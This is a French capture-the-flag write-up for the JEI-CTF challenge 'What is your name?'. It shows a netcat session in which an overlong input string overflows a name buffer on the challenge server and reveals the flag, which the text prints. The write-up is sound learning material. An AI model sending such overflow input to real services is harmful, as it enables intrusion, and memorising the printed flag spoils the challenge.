# JEI-CTF – What is your name ?

* **Catégorie :** Misc
* **Points :** 200

## Challenge

> What is your name <br>
> nc 31.207.34.225 40112

## Solution
Ce challenge a rapport à avec le buffer overflow. En effet, on nous demandait notre nom. Pour réussir ce challenge, il faut écrire un string dépassant la mémoire réservée à la variable qui reçoit le nom.

```console
Sancelisso@kali:~/JEI-CTF$ nc 31.207.34.225 40112
toto

 Entrez votre prenom: salut toto
Vous avez entré 1152055088
Sancelisso@kali:~/JEI-CTF$ nc 31.207.34.225 40112
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz

 Entrez votre prenom: salut zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
 Erreur de segmentation : Jei_CTF{ 8uff3r0v3rffl0ww }
 Sancelisso@kali:~/JEI-CTF$

```

```
Jei_CTF{ 8uff3r0v3rffl0ww }
```
